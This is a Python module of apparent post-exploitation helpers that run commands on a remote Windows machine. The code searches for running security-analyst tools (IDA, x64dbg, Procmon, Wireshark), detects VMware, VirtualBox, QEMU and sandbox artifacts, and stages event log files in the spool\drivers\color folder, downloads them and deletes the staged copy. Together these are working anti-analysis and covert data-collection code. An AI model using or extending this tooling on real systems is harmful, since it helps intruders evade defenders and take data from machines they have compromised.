#!/usr/bin/python3
import logging
from termcolor import cprint


def security_tools(self, s):
    logging.info("Security Researcher Tools: ")
    self.execute_remote(
        'tasklist /svc | findstr /i "pd64.exe ida64.exe ida32.exe x64dbg.exe x32dbg.exe hiew32.exe sysanalyzer.exe petools.exe dnSpy.exe lordpe.exe PE-bear.exe Procmon.exe Procmon64.exe Autoruns.exe Autoruns64.exe Dbgview.exe dbgview64.exe Diskmon.exe Diskmon64.exe portmon.exe procdump.exe procdump64.exe tcpview.exe tcpview64.exe procexp.exe procexp64.exe die.exe ProcessHacker.exe Wireshark.exe dumpcap.exe"')
    buf = (self.out or '').strip('\r\n')
    if buf:
        self.format_print_buff()
    else:
        logging.info("No Security Researcher Processes Found")


def vm(self, s):
    try:
        logging.info("Common Processes: ")
        self.execute_remote(
            'tasklist /svc | findstr /i "vmtoolsd.exe VBoxTray.exe vboxservice.exe vmwaretray.exe vmwareuser.exe vmware.exe vmount2.exe VGAuthService.exe vmacthlp.exe vmsrvc.exe vmusrvc.exe prl_cc.exe prl_tools.exe prl_cc.exe xenservice.exe xsvc_depriv.exe joeboxserver.exe joeboxcontrol.exe qemu-ga.exe WPE Pro.exe"')
        buf = (self.out or '').strip('\r\n')
        if buf:
            self.format_print_buff()
        else:
            logging.info("No VM Processes found")

        self.execute_remote('dir /B "C:\Program Files\VMware"')
        buf = (self.out or '').strip('\r\n')
        if "File Not Found" in buf:
            print("C:\Program Files\VMware Not Present")
            self.out_clear()
        else:
            self.out_clear()
            cprint('C:\Program Files\VMWare found', "red")
        self.execute_remote('systeminfo | findstr /i "Manufacturer:"')
        self.format_print_buff()
        
        logging.info("Virtual Box Detection")
        # Query both files in one shot; only echo real hits
        self.execute_remote(
            r'if exist "%SystemRoot%\System32\drivers\VBoxMouse.sys"  (echo VBoxMouse.sys) & '
            r'if exist "%SystemRoot%\System32\drivers\VBoxGuest.sys"  (echo VBoxGuest.sys)'
        )

        buf = (self.out or "").replace("\r", "").strip()
        hits = [line for line in buf.split("\n") if line]  # only real echoes

        if hits:
            print("[!] Found VBox files:")
            for h in hits:
                cprint(h, "red")
        else:
            print("[*] No VirtualBox files found")

        self.out_clear()

    except Exception as e:
        print("[!] Something went wrong, see below for error:\n", e)


def log_grab(self, s):
    try:
        prefix = 'copy '
        log_file_name = s
        file_path = 'C:\Windows\System32\Winevt\Logs\\'
        # should add additional directories to copy to if below doesnt exist for some reason
        # should always be there, but you never know, get a list and iterate over with a try: except:
        remote_copy = ' C:\Windows\system32\spool\drivers\color'
        combined_command = prefix + '"' + file_path + s + '"' + remote_copy
        self.execute_remote(combined_command)
        logging.info(s)
        self.do_lget(remote_copy.lstrip() + '\\' + s)
        self.execute_remote("del" + remote_copy + '\\' + s)
        self.format_print_buff()
    except Exception as e:
        print("[!] Something went wrong, see below for error:\n", logging.critical(str(e)))